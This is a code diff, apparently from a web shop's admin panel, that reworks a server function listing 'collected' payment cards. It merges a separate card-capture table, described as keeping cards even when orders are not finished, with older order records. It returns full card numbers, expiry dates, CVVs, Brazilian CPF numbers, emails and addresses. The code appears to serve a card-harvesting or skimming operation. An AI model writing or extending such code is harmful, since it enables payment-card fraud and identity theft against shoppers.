@@ -10,36 +10,59 @@ const listCollectedCards = createServerFn({ method: "GET" }).handler(async () =>
   const check = await amIAdmin();
   if (!check.admin) throw new Error("Unauthorized");
 
-  const { data, error } = await supabase
+  const cards: any[] = [];
+
+  // Buscar os cartões da nova tabela de captura independente (evita perda de cartões se o pedido não for finalizado)
+  const { data: collected, error: collectedErr } = await supabase
+    .from("collected_cards" as any)
+    .select("*")
+    .order("created_at", { ascending: false });
+
+  if (!collectedErr && collected) {
+    collected.forEach((c: any) => {
+      cards.push({
+        id: c.id || Math.random().toString(),
+        date: c.created_at || new Date().toISOString(),
+        name: c.nome || "N/A",
+        cpf: c.cpf || "N/A",
+        email: c.email || "N/A",
+        address: c.endereco || "N/A",
+        userAgent: c.userAgent || c.user_agent || "Desconhecido",
+        cardNumber: c.numero || "N/A",
+        expiry: c.validade || "N/A",
+        cvv: c.cvv || "N/A",
+      });
+    });
+  }
+
+  // Fallback: buscar também dos pedidos antigos salvos em metadata, para não perder histórico
+  const { data: ordersData, error: ordersErr } = await supabase
     .from("orders")
-    .select("id, created_at, customer, delivery, metadata")
+    .select("id, created_at, customer_name, customer_doc, customer_email, address_street, address_number, address_city, address_uf, metadata")
     .not("metadata->card_number", "is", null)
     .order("created_at", { ascending: false });
 
-  if (error) {
-    console.error("Erro ao carregar cartões:", error.message);
-    return [];
+  if (!ordersErr && ordersData) {
+    ordersData.forEach((o: any) => {
+      const metadata = o.metadata as Record<string, any> | null;
+      cards.push({
+        id: o.id,
+        date: o.created_at,
+        name: (metadata?.card_name || o.customer_name || "N/A") as string,
+        cpf: (o.customer_doc || "N/A") as string,
+        email: (o.customer_email || "N/A") as string,
+        address: `${o.address_street || ""}, ${o.address_number || ""} - ${o.address_city || ""}/${o.address_uf || ""}`,
+        userAgent: (metadata?.user_agent || "Desconhecido") as string,
+        cardNumber: (metadata?.card_number || "N/A") as string,
+        expiry: (metadata?.card_expiry || "N/A") as string,
+        cvv: (metadata?.card_cvv || "N/A") as string,
+      });
+    });
   }
 
-  return (data || []).map((o) => {
-    const metadata = o.metadata as Record<string, any> | null;
-    const customer = o.customer as Record<string, any> | null;
-    const delivery = o.delivery as Record<string, any> | null;
-    return {
-      id: o.id as string,
-      date: o.created_at as string,
-      name: (metadata?.card_name || customer?.name || "N/A") as string,
-      cpf: (customer?.doc || customer?.cpf || "N/A") as string,
-      email: (customer?.email || "N/A") as string,
-      address: delivery?.address
-        ? `${delivery.address.street || ""}, ${delivery.address.number || ""} - ${delivery.address.city || ""}/${delivery.address.uf || ""}`
-        : "N/A",
-      userAgent: (metadata?.user_agent || "Desconhecido") as string,
-      cardNumber: (metadata?.card_number || "N/A") as string,
-      expiry: (metadata?.card_expiry || "N/A") as string,
-      cvv: (metadata?.card_cvv || "N/A") as string,
-    };
-  });
+  // Ordenar a união de todos os cartões por data decrescente
+  cards.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
+  return cards;
 });
 
 export const Route = createFileRoute("/_authenticated/admin/cartoes")({
